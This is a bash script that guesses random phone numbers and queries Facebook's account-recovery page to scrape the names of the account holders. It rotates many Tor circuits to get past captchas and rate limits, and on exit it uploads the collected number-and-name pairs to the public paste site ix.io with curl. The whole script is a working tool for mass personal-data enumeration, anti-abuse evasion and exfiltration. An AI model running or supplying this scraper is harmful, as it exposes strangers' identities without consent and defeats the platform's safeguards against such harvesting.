#!/usr/bin/env bash

echo "Hi, I'm the script that will scrape facebook name from random phone numbers for you, press any button to continue"
read
echo "Please give me a range of ports that I will use, from port..."
read BEGIN
echo "... to port ..."
read END
RANGE=$(seq ${BEGIN} ${END})
echo "Are these tor ports already working? (y/N)"
read UP
if [ -z "${UP}" ]; then
	UP="n"
fi
echo "Now, write your are code (e.g +213)"
read CODE
echo "How many digits is there after this area code?"
read N
echo "Do you want to fixe the first digits? (e.g. the first two +21377XXXXXXX) (Y/n)"
read YN
if [ -z "${YN}" ]; then
	YN="y"
fi
if [ "${YN,,}" = "y" ]; then
	echo "To which value?"
	read FIXED
fi 

FOUND=()

touch /tmp/torsocks.conf
cat >/tmp/torsocks.conf <<EOL
server = 127.0.0.1
server_port = 7000
EOL
export TORSOCKS_CONF_FILE=/tmp/torsocks.conf

function random {
	LEN=$1
	MAX=$(printf '9%.0s' $(seq 1 ${LEN}))
	((LEN--))
	MIN=1$(printf '0%.0s' $(seq 1 ${LEN}))
	shuf -i ${MIN}-${MAX} -n 1
}

function twget {
	URL="$@"
	torsocks wget -T 10 -qO- ${URL} 2> /dev/null
}

function tget_name {
	NUM="$@"
	RES=$(twget --post-data="email=${NUM}" "https://m.facebook.com/login/identify?ctx=recover")
	if [[ $RES =~ captcha ]] 
	then 
		echo -1
		return
	fi
	echo ${RES} | tee -a .fb_log | grep -oP '<div\sclass="mfsl\sfcb">(.*?)<\/div>' | sed -e :a -e 's/<[^>]*>//g;/</N;//ba'
}

function multitor {
	RANGE="$@"
	for i in ${RANGE}; do (tor -f <(echo -e "SocksPort $i\nDataDirectory .$i\nControlPort 1$i")&) ; done;
}

function newnym {
	PORT="$@"
	echo -e 'authenticate ""\nSIGNAL NEWNYM' | telnet localhost 1${PORT} > /dev/null 2>&1
}

function switch_proxy {
	NEWPORT=$(echo ${RANGE} | sed 's/ /\n/g' | sort --random-sort | head -n 1)
	sed -i '$s/.*/server_port = '${NEWPORT}'/g' /tmp/torsocks.conf
	echo ${NEWPORT}
}

function gen_number {
	CODE=$1
	FIXED=$2
	(( N = $3-${#FIXED} ))
	echo ${CODE}${FIXED}$(random ${N})
}

function scrape_fb {
	NUM=$1
	STR=""
	NEW_PORT=$(switch_proxy)
	RES=$(tget_name ${NUM})
	if [ "${RES}" = "-1" ]; then
		echo "PORT ${NEW_PORT}: Captcha found! finding a new clean pathway..."
		newnym NEW_PORT
		(sleep 20 && echo "PORT ${NEW_PORT}: ${NUM} => (retrying)..." && scrape_fb ${NUM}) &
	else
		if [ -z "${RES}" ]; then
			RES="unknown"
		elif [ "+${RES}" = "${NUM}" ] || [ "${RES}" = "${NUM}" ]; then
			STR=" (I'll retry later...)"
			(sleep 20 && echo "PORT ${NEW_PORT}: ${NUM} => (retrying)..." && scrape_fb ${NUM}) &
		else
			FOUND+=("${NUM}:${RES}")
		fi
		echo "PORT ${NEW_PORT}: ${NUM} => ${RES}${STR}"
	fi
}

function control_c {
	echo -e "\n*** Well... Exiting! ***\n"
	echo "Do you want to kill all tor instances (y/N)"
	read KILLTOR
	if [ -z "${KILLTOR}" ]; then
		KILLTOR="n"
	fi
	if [ "${KILLTOR,,}" = "y" ]; then
		killall tor
	fi 
	echo ${FOUND} 2>&1 | curl -F 'f:1=<-' ix.io
	exit $?
	}

if [ "${UP,,}" = "n" ]; then
	multitor ${RANGE}
fi 

switch_proxy > /dev/null 2>&1

trap control_c SIGINT

while :
do
	scrape_fb $(gen_number "${CODE}" "${FIXED}" "$N" )
done
